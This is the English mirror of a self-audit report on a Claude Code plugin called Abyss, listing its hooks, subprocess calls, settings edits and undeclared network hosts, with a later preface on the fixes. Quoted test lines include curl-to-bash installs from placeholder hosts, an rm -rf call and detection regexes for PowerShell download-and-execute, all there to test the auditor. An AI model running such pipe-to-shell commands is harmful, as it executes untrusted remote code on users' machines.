# Abyss on Abyss

*[Versión en castellano](AUDITORIA_DE_ABYSS.md)*

---

## Second pass, 2026-09-09: from `rompe` to `sin hallazgos`

The report below is the FIRST one, and it stays as it is: it's what the auditor found the
first time, and deleting it would delete the history. This is what it says today, on the same
repository, after fixing what it pointed at itself.

**Verdict: `sin hallazgos` (no findings).** None of the four checks that score. The fourth
one — the one that really matters, what leaves the machine — comes out clean, and so does the
first one now that the package declares an author.

Worth saying what that means and what it doesn't: it's "as far as this yardstick looks, I
found nothing", and the yardstick looks at five specific things. It is not a certificate that
the package is good.

What changed, and why the number dropped so far:

- **The hosts, declared.** The 35 the code uses and no README named are now in `README.md`
  and `README.en.md`, grouped by which skill calls them, when, and which ones never touch the
  network without a key. The eight vendor ones (`vivo.com`, `zeiss.com`, `nikon.com`…) are
  never called: they're destinations the viewer may OPEN a browser at.
- **The tests stopped accusing themselves.** A file that tests an auditor has to invent
  domains so the auditor catches them, and this one counted them as real calls:
  `api.declarado.com`, `api.oculto.net`, `api.sinesquema.io`, `copia-sospechosa.example`…
  There's now a third category, `hosts_en_pruebas`, with the same rule already applied to
  `vendor/dist/build`: **they get declared, not accused**. There are 37.
- **A 782 MB browser profile** had been left inside the package and accounted on its own for
  3.082 findings, with domains coming out of a Brave block list. Gone, and the profile now
  lives in the system cache.
- **The publishable report no longer carries the absolute path** of the machine it ran on: a
  document meant to be published needn't say in whose folder it was generated.

- **The author, declared.** It was the last finding standing, and it wasn't a code defect:
  it was missing who signs. It's now in `LICENSE` (the copyright holder), in
  `.claude-plugin/plugin.json` (the field this check reads) and in
  `.claude-plugin/marketplace.json` (what whoever installs sees). Nowhere else in the
  repository: the test that guards it has those three files as its only exception.

What did NOT change: checks 2 and 3 were at zero before and are at zero now. This package
never hid a command nor wrote outside its own folder without declaring it.

---


English mirror of [`docs/AUDITORIA_DE_ABYSS.md`](AUDITORIA_DE_ABYSS.md): the first report of
`abyss/auditar.py` on the repository itself, generated with:

```
python abyss/auditar.py . --markdown docs/AUDITORIA_DE_ABYSS.md
```

`auditar.py` has no `--idioma` flag and keeps its own printed
output in Spanish (only `instalar.py`'s own text is bilingual) — so
everything below, from the verdict line onward, is the SAME output the
script wrote (`a_markdown()`), copied as is, not a second run and not a
single finding edited — including what it fails on: the provenance manifest
has no real author (see check 1 below). Two honest notes from whoever ran
this audit, NOT from the script itself, before reading it:

1. **Anonymized path**: `auditar.py` prints the absolute path it is given;
   here it has been replaced by hand with `<root of the Abyss repo>` because,
   on the machine where this report was generated, that path carries a
   personal user folder — a hard rule of this repo (no `C:/Users/<someone>`
   paths published). The rest of the report has not been touched.
2. **`pruebas/` counts as audited code, on purpose**: it was run over the
   whole repo root (not just `abyss/`) so that check 1 (provenance) reaches
   `.claude-plugin/plugin.json` and check 2 (commands) reaches
   `hooks/hooks.json` — neither one lives inside `abyss/`. The price is that
   check 4 (what leaves the machine) also counts the example domains that
   the test battery itself uses on purpose to put the AUDITING SCRIPT to the
   test (`pruebas/test_auditar.py`, `pruebas/test_vigia_dominios.py`,
   `pruebas/datos/paquete_sintetico/malo.py`…) as if they were the
   distributed package's real network traffic — they are not. Whoever reads
   check 4's host list has to separate the ones coming from `abyss/*.py`
   (real) from the ones coming from `pruebas/*.py` (fixtures). A future audit
   over `abyss/` alone would instead lose the manifest and the hooks — no cut
   is free, and `auditar.py` does not decide for the reader which one
   matters.

The most real and persistent finding among check 4's (and the one truly
worth reading): several of the package's network services (Pollinations,
Hugging Face, Cloudflare Workers AI, Together, AI Horde, Openverse, The Met,
Art Institute of Chicago, Mapillary, Google Maps/Street View…) are named in
the README **by brand**, not by the exact host the code uses
(`gen.pollinations.ai`, `router.huggingface.co`, `api.cloudflare.com`…) — an
honest, expected check under this batch's own specification ("with whatever
comes out, including what it fails on"), not a defect of this report.

---

**Veredicto**: rompe

## Hallazgos

| severidad | comprobación | fichero:línea | qué dice |
|---|---|---|---|
| roza | procedencia | `.claude-plugin/plugin.json` | ningún manifiesto declara un autor con nombre real (vacío o placeholder de plantilla) (sí hay 3 commit(s) de git, desde 2026-09-07T09:42:44+02:00: hay trazabilidad) |
| rompe | red | `abyss/imagen.py:225` | el código usa el host "aihorde.net" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:151` | el código usa el host "api.artic.edu" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:175` | el código usa el host "api.cloudflare.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:359` | el código usa el host "api.declarado.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:369` | el código usa el host "api.oculto.net" y ningún README del paquete lo nombra |
| rompe | red | `abyss/exterocepcion.py:192` | el código usa el host "api.open-meteo.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:327` | el código usa el host "api.openverse.org" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:392` | el código usa el host "api.sinesquema.io" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:200` | el código usa el host "api.together.xyz" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:285` | el código usa el host "api.windy.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:156` | el código usa el host "artic.edu" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:120` | el código usa el host "collectionapi.metmuseum.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:332` | el código usa el host "commons.wikimedia.org" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:407` | el código usa el host "copia-sospechosa.example" y ningún README del paquete lo nombra |
| rompe | red | `abyss/vigia.py:154` | el código usa el host "copia.ejemplo.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:386` | el código usa el host "de-terceros.example.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/render3d.py:586` | el código usa el host "discourse.threejs.org" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_vigia_dominios.py:42` | el código usa el host "dominio-copia-falsa.net" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_vigia_dominios.py:103` | el código usa el host "dominio-jamas-visto.xyz" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_vigia_dominios.py:38` | el código usa el host "dominio-legitimo.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/taller.py:83` | el código usa el host "download.pytorch.org" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_mundo.py:334` | el código usa el host "e.org" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:416` | el código usa el host "ejemplo.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_lectura_visual.py:335` | el código usa el host "ejemplo.es" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_mundo.py:305` | el código usa el host "ejemplo.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:334` | el código usa el host "es.wikipedia.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:163` | el código usa el host "gen.pollinations.ai" y ningún README del paquete lo nombra |
| rompe | red | `abyss/exterocepcion.py:129` | el código usa el host "geocoding-api.open-meteo.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/lectura_visual.py:334` | el código usa el host "github.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:256` | el código usa el host "graph.mapillary.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_mundo.py:407` | el código usa el host "images.metmuseum.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:269` | el código usa el host "mapillary.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:226` | el código usa el host "maps.googleapis.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_vigia_dominios.py:64` | el código usa el host "otro-sitio-desconocido.io" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_vigia_dominios.py:81` | el código usa el host "paquete-de-siempre.com" y ningún README del paquete lo nombra |
| rompe | red | `abyss/imagen.py:212` | el código usa el host "router.huggingface.co" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/datos/paquete_sintetico/malo.py:12` | el código usa el host "telemetria.dominio-no-declarado.net" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:399` | el código usa el host "tercera.example.net" y ningún README del paquete lo nombra |
| rompe | red | `abyss/render3d.py:585` | el código usa el host "threejs.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/infografia.py:148` | el código usa el host "w3.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:319` | el código usa el host "wikidata.org" y ningún README del paquete lo nombra |
| rompe | red | `abyss/mundo.py:298` | el código usa el host "windy.com" y ningún README del paquete lo nombra |
| rompe | red | `pruebas/test_auditar.py:312` | el código usa el host "x.example.com" y ningún README del paquete lo nombra |

## 1 · Procedencia
- Manifiestos encontrados: ['.claude-plugin/plugin.json', '.claude-plugin/marketplace.json']
  - `.claude-plugin/plugin.json`: autor = (vacío) — placeholder/sin nombre real
  - `.claude-plugin/marketplace.json`: autor = el usuario — placeholder/sin nombre real
- Historial: 3 commit(s), primero 2026-09-07T09:42:44+02:00

## 2 · Comandos
- `hooks/hooks.json:8` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --arranque`
- `hooks/hooks.json:17` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --arranque`
- `hooks/hooks.json:26` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/cuerpo.py" --arranque`
- `hooks/hooks.json:37` SessionEnd: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --cierre`
- `hooks/hooks.json:48` UserPromptSubmit **(cada mensaje)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --despertar`
- `hooks/hooks.json:57` UserPromptSubmit **(cada mensaje)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/cuerpo.py" --despertar`
- `hooks/hooks.json:68` PostToolUse **(tras cada herramienta)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --herramienta`
- `hooks/hooks.json:79` Stop: `python "${CLAUDE_PLUGIN_ROOT}/abyss/vigia.py" --verificar`
- `hooks/hooks.json:88` Stop: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --fin`
- `abyss/auditar.py:40` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `(`curl/wget/iwr/irm | bash/sh/iex`) — como EVIDENCIA (no todo uso de`
- `abyss/auditar.py:117` llamada a subprocess/os.system/eval/exec: `r'(subprocess\.\w+|os\.system\(|[^.\w]eval\(|[^.\w]exec\(|Invoke-Expression|(?<!\w)iex\s|powershell\s+-enc)', re.I)`
- `abyss/auditar.py:364` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['git', '-C', ruta, 'log', '--format=%cI'],`
- `abyss/auditar.py:369` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `abyss/auditar.py:475` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `'nota': 'descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex)',`
- `abyss/continuidad.py:337` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, os.path.join(CODE, 'varas.py'), '--index'],`
- `abyss/continuidad.py:339` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.DEVNULL)  # nunca heredar el stdin del propio gancho`
- `abyss/cuerpo.py:103` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
- `abyss/cuerpo.py:113` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['wmic', 'cpu', 'get', 'loadpercentage'], capture_output=True, text=True, timeout=5)`
- `abyss/cuerpo.py:182` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)`
- `abyss/cuerpo.py:216` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
- `abyss/cuerpo.py:237` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
- `abyss/cuerpo.py:270` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pmset', '-g', 'batt'], capture_output=True, text=True, timeout=5)`
- `abyss/huella.py:231` llamada a subprocess/os.system/eval/exec: `con `Popen` (no `subprocess.run`, que no lo expone) porque quien fotografía`
- `abyss/huella.py:236` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(['powershell', '-NoProfile', '-NonInteractive', '-Command', cmd],`
- `abyss/huella.py:237` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)`
- `abyss/huella.py:242` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `abyss/huella.py:334` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ss', '-ltnp'], capture_output=True, text=True, timeout=5)`
- `abyss/huella.py:340` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['lsof', '-iTCP', '-sTCP:LISTEN', '-P', '-n'], capture_output=True, text=True, timeout=5)`
- `abyss/huella.py:353` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ps', '-eo', 'pid,lstart,comm'], capture_output=True, text=True, timeout=5)`
- `abyss/huella.py:638` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, timeout=8)`
- `abyss/lectura_visual.py:174` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass'] + args,`
- `abyss/lectura_visual.py:255` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(args, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)`
- `abyss/lectura_visual.py:355` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', '$input | Set-Clipboard'],`
- `abyss/lectura_visual.py:359` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pbcopy'], input=texto_plano, text=True, encoding='utf-8', errors='replace', timeout=8)`
- `abyss/lectura_visual.py:362` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['xclip', '-selection', 'clipboard'], input=texto_plano, text=True,`
- `abyss/lectura_visual.py:653` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', script],`
- `abyss/render3d.py:998` llamada a subprocess/os.system/eval/exec: `subprocess.run(cmd, capture_output=True, timeout=45)`
- `abyss/rutas.py:61` llamada a subprocess/os.system/eval/exec: ``varas.py --index` con `subprocess.run` heredando el stdin del propio gancho — si`
- `abyss/video_pintura.py:108` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)`
- `abyss/vigia.py:39` llamada a subprocess/os.system/eval/exec: ``Invoke-Expression`, `powershell -enc`) cuya fuente no esté en el turno. A`
- `abyss/vigia.py:41` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `copias»), estos DOS tipos SÍ miran dentro de ellos: un `curl … | bash` suele`
- `abyss/vigia.py:145` llamada a subprocess/os.system/eval/exec: `r'|\b(?:iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n|]*\|\s*(?:iex|invoke-expression)\b'`
- `abyss/vigia.py:147` llamada a subprocess/os.system/eval/exec: `r'|\bwinget\s+install\b|\bchoco(?:latey)?\s+install\b|\bInvoke-Expression\b'`
- `abyss/vigia.py:313` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `# `respuesta`, no `sin_codigo`) — un `curl … | bash` suele venir precisamente`
- `pruebas/ayudas.py:69` llamada a subprocess/os.system/eval/exec: `Sin `errors='replace'` eso revienta el propio `subprocess.run` con un`
- `pruebas/ayudas.py:72` llamada a subprocess/os.system/eval/exec: `return subprocess.run(`
- `pruebas/test_auditar.py:137` llamada a subprocess/os.system/eval/exec: `subprocess.run(cmd, cwd=tmp, check=True, capture_output=True)`
- `pruebas/test_auditar.py:139` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'add', '.'], cwd=tmp, check=True, capture_output=True)`
- `pruebas/test_auditar.py:140` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'commit', '-q', '-m', 'uno'], cwd=tmp, check=True, capture_output=True)`
- `pruebas/test_auditar.py:164` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'add', '.'], cwd=d, check=True, capture_output=True)`
- `pruebas/test_auditar.py:165` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'commit', '-q', '-m', 'dos'], cwd=d, check=True, capture_output=True)`
- `pruebas/test_auditar.py:174` llamada a subprocess/os.system/eval/exec: `with mock.patch('subprocess.run', side_effect=AssertionError('no debería llamarse')):`
- `pruebas/test_auditar.py:181` llamada a subprocess/os.system/eval/exec: `with mock.patch('subprocess.run', side_effect=FileNotFoundError()):`
- `pruebas/test_auditar.py:305` llamada a subprocess/os.system/eval/exec: `(Path(d) / 'x.py').write_text('import os\nos.system("rm -rf /tmp/x")\n', encoding='utf-8')`
- `pruebas/test_auditar.py:312` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `(Path(d) / 'y.sh').write_text('curl -s https://x.example.com/i.sh | bash\n', encoding='utf-8')`
- `pruebas/test_huella.py:405` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'])`
- `pruebas/test_huella.py:431` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_instalador_no_cuelga.py:72` llamada a subprocess/os.system/eval/exec: `return subprocess.run(`
- `pruebas/test_instalador_no_cuelga.py:82` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_instalador_no_cuelga.py:91` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_instalador_no_cuelga.py:101` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_lectura_visual.py:179` llamada a subprocess/os.system/eval/exec: `"""`_ocr_tesseract()` en proceso, con `subprocess.run` sustituido (nunca toca`
- `pruebas/test_lectura_visual.py:577` llamada a subprocess/os.system/eval/exec: ``ok: False` SIN ejecutar ningún `subprocess.run` — se comprueba con un`
- `pruebas/test_leer_stdin_no_bloquea.py:14` llamada a subprocess/os.system/eval/exec: `Se usa `subprocess.Popen` a mano (no `ayudas.ejecutar`, que usa `subprocess.run``
- `pruebas/test_leer_stdin_no_bloquea.py:55` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
- `pruebas/test_leer_stdin_no_bloquea.py:57` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
- `pruebas/test_leer_stdin_no_bloquea.py:66` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_leer_stdin_no_bloquea.py:95` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
- `pruebas/test_leer_stdin_no_bloquea.py:100` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
- `pruebas/test_leer_stdin_no_bloquea.py:110` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_leer_stdin_no_bloquea.py:129` llamada a subprocess/os.system/eval/exec: ``varas.py --index` con `subprocess.run` — si no se le pasa `stdin=DEVNULL`, el`
- `pruebas/test_leer_stdin_no_bloquea.py:134` llamada a subprocess/os.system/eval/exec: `fuente, que la llamada lleva `stdin=subprocess.DEVNULL` — con el fallo, esta`
- `pruebas/test_leer_stdin_no_bloquea.py:141` llamada a subprocess/os.system/eval/exec: `# la llamada a subprocess.run completa: desde 'varas.py' hasta el próximo ')'`
- `pruebas/test_leer_stdin_no_bloquea.py:142` llamada a subprocess/os.system/eval/exec: `# que cierra subprocess.run(...) — basta con mirar los ~300 caracteres siguientes`
- `pruebas/test_leer_stdin_no_bloquea.py:144` llamada a subprocess/os.system/eval/exec: `self.assertIn('stdin=subprocess.DEVNULL', fragmento,`
- `pruebas/test_leer_stdin_no_bloquea.py:145` llamada a subprocess/os.system/eval/exec: `'subprocess.run([sys.executable, ..., "varas.py", "--index"], ...) '`
- `pruebas/test_leer_stdin_no_bloquea.py:146` llamada a subprocess/os.system/eval/exec: `'debe pasar stdin=subprocess.DEVNULL para no heredar el del gancho')`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:47` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:49` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:58` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:79` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:81` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
- `pruebas/test_stdin_no_se_lee_dos_veces.py:87` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_taller.py:109` llamada a subprocess/os.system/eval/exec: `self.proc = subprocess.Popen(`
- `pruebas/test_taller.py:112` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8',`
- `pruebas/test_taller.py:127` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
- `pruebas/test_taller.py:169` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, str(SCRIPT), '--puerto', '0'],`
- `pruebas/test_taller.py:236` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, str(SCRIPT), '--no-existe', 'x'],`
- `pruebas/test_vigia_dominios.py:12` llamada a subprocess/os.system/eval/exec: ``choco`, `Invoke-Expression`, `powershell -enc`) cuya fuente no está en el turno.`
- `pruebas/test_vigia_dominios.py:64` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `'Instálala así:\n```\ncurl -fsSL https://otro-sitio-desconocido.io/setup.sh | bash\n```',`
- `pruebas/test_vigia_dominios.py:73` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `self.assertTrue(any('curl' in c and '| bash' in c for c in cazas['comandos']), cazas['comandos'])`
- `pruebas/test_vigia_dominios.py:81` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `comando = 'curl -fsSL https://paquete-de-siempre.com/instalar.sh | bash'`

## 3 · Permisos
- Declara cómo deshacerlo en algún README: True
- `instalar.py:6`: `- Escribe ganchos en TU `settings.json` (por defecto `~/.claude/settings.json`,`
- `instalar.py:10`: `- Como ese `settings.json` es GLOBAL, los ganchos disparan en TODOS tus proyectos`
- `instalar.py:15`: `- Antes de tocar `settings.json` deja una COPIA FECHADA al lado`
- `instalar.py:16`: `(`settings.json.abyss-AAAAMMDD-HHMMSS.bak`).`
- `instalar.py:32`: `imprime todos con su estado real leído de `settings.json`.`
- `instalar.py:40`: `Comunes a instalar/desinstalar: `--settings <ruta>` (pruebas, o un settings.json`
- `instalar.py:52`: `está `~/.claude`, qué proyecto, qué `python`) se resuelve en tiempo de ejecución.`
- `instalar.py:67`: `SETTINGS_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'settings.json')`
- `instalar.py:72`: `# carpeta de skills del usuario, igual que `~/.claude/settings.json` es la carpeta`
- `instalar.py:80`: `SKILLS_DIR_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'skills')`
- `instalar.py:111`: `# `claves` son claves de nivel superior en settings.json que se fijan SOLO si el`
- `instalar.py:117`: `# en ningún `settings.json` real encontrado en esta máquina — se quitó el 6-sep tras`
- `instalar.py:187`: `'en el mismo paquete, sin módulo de instalación propio (sin gancho, no toca settings.json). '`
- `instalar.py:262`: `toca='copia skills/esceptico/ a <skills-dir>/esceptico/ (por defecto ~/.claude/skills/esceptico/, '`
- `instalar.py:263`: `'ver --skills-dir); no es Python, no toca settings.json ni mem',`
- `instalar.py:284`: `linea='Da permiso de Edit sobre tu settings.json (autoedición). APAGADO por defecto.',`
- `instalar.py:285`: `toca='clave permissions.allow += "Edit(<settings.json>)"',`
- `instalar.py:286`: `hooks=[], aviso='deja que el propio asistente edite settings.json sin preguntar cada vez.'),`
- `instalar.py:296`: `# JSON con backup: leer/escribir settings.json y el manifiesto siempre por aquí.`
- `instalar.py:311`: `cada `\\n` del texto a `\\r\\n` al escribir, así que un `settings.json` de`

## 4 · Qué sale de la máquina
- `aihorde.net` — **sin nombrar en el README**: abyss/imagen.py:225, abyss/imagen.py:307
- `api.artic.edu` — **sin nombrar en el README**: abyss/mundo.py:151
- `api.cloudflare.com` — **sin nombrar en el README**: abyss/imagen.py:175, abyss/imagen.py:306
- `api.declarado.com` — **sin nombrar en el README**: pruebas/test_auditar.py:359
- `api.oculto.net` — **sin nombrar en el README**: pruebas/test_auditar.py:369, pruebas/test_auditar.py:370
- `api.open-meteo.com` — **sin nombrar en el README**: abyss/exterocepcion.py:192
- `api.openverse.org` — **sin nombrar en el README**: abyss/imagen.py:327
- `api.sinesquema.io` — **sin nombrar en el README**: pruebas/test_auditar.py:392
- `api.together.xyz` — **sin nombrar en el README**: abyss/imagen.py:200, abyss/imagen.py:306
- `api.windy.com` — **sin nombrar en el README**: abyss/mundo.py:285
- `artic.edu` — **sin nombrar en el README**: abyss/mundo.py:156, abyss/mundo.py:168, pruebas/test_mundo.py:109
- `collectionapi.metmuseum.org` — **sin nombrar en el README**: abyss/mundo.py:120, abyss/mundo.py:130
- `commons.wikimedia.org` — **sin nombrar en el README**: abyss/imagen.py:332, abyss/mundo.py:182
- `copia-sospechosa.example` — **sin nombrar en el README**: pruebas/test_auditar.py:407
- `copia.ejemplo.com` — **sin nombrar en el README**: abyss/vigia.py:154
- `de-terceros.example.com` — **sin nombrar en el README**: pruebas/test_auditar.py:386
- `discourse.threejs.org` — **sin nombrar en el README**: abyss/render3d.py:586, pruebas/test_render3d.py:331, pruebas/test_render3d.py:340
- `dominio-copia-falsa.net` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:42
- `dominio-jamas-visto.xyz` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:103
- `dominio-legitimo.com` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:38, pruebas/test_vigia_dominios.py:41
- `download.pytorch.org` — **sin nombrar en el README**: abyss/taller.py:83
- `e.org` — **sin nombrar en el README**: pruebas/test_mundo.py:334
- `ejemplo.com` — **sin nombrar en el README**: pruebas/test_auditar.py:416
- `ejemplo.es` — **sin nombrar en el README**: pruebas/test_lectura_visual.py:335
- `ejemplo.org` — **sin nombrar en el README**: pruebas/test_mundo.py:305
- `es.wikipedia.org` — **sin nombrar en el README**: abyss/mundo.py:334
- `gen.pollinations.ai` — **sin nombrar en el README**: abyss/imagen.py:163, abyss/imagen.py:305
- `geocoding-api.open-meteo.com` — **sin nombrar en el README**: abyss/exterocepcion.py:129
- `github.com` — **sin nombrar en el README**: abyss/lectura_visual.py:334, pruebas/test_auditar.py:47, pruebas/test_auditar.py:193, pruebas/test_auditar.py:231, pruebas/test_manifiestos_plugin.py:13
- `google.com` — nombrado en el README: abyss/mundo.py:238
- `graph.mapillary.com` — **sin nombrar en el README**: abyss/mundo.py:256
- `images.metmuseum.org` — **sin nombrar en el README**: pruebas/test_mundo.py:407
- `ipinfo.io` — nombrado en el README: abyss/exterocepcion.py:116, pruebas/test_presupuesto_red.py:66, pruebas/test_presupuesto_red.py:74
- `mapillary.com` — **sin nombrar en el README**: abyss/mundo.py:269
- `maps.googleapis.com` — **sin nombrar en el README**: abyss/mundo.py:226, abyss/mundo.py:233
- `news.google.com` — nombrado en el README: abyss/noticias.py:158, abyss/noticias.py:179, abyss/noticias.py:214, abyss/noticias.py:226, pruebas/test_presupuesto_red.py:88, pruebas/test_presupuesto_red.py:94
- `nominatim.openstreetmap.org` — nombrado en el README: abyss/exterocepcion.py:136
- `otro-sitio-desconocido.io` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:64
- `paquete-de-siempre.com` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:81
- `router.huggingface.co` — **sin nombrar en el README**: abyss/imagen.py:212, abyss/imagen.py:307
- `telemetria.dominio-no-declarado.net` — **sin nombrar en el README**: pruebas/datos/paquete_sintetico/malo.py:12
- `tercera.example.net` — **sin nombrar en el README**: pruebas/test_auditar.py:399
- `threejs.org` — **sin nombrar en el README**: abyss/render3d.py:585, pruebas/test_render3d.py:330, pruebas/test_render3d.py:339
- `w3.org` — **sin nombrar en el README**: abyss/infografia.py:148, abyss/render3d.py:578, pruebas/test_infografia.py:22, pruebas/test_render3d.py:52, pruebas/test_render3d.py:332, pruebas/test_render3d.py:345, pruebas/test_render3d.py:347
- `wikidata.org` — **sin nombrar en el README**: abyss/mundo.py:319, abyss/mundo.py:330
- `windy.com` — **sin nombrar en el README**: abyss/mundo.py:298
- `x.example.com` — **sin nombrar en el README**: pruebas/test_auditar.py:312

## 5 · Dominio (lectura manual)
- este guion NO dice si un dominio es legítimo; solo los reúne para lectura carácter a carácter — contra eso solo vale leer, no un regex.

`github.com`, `pytorch.org`
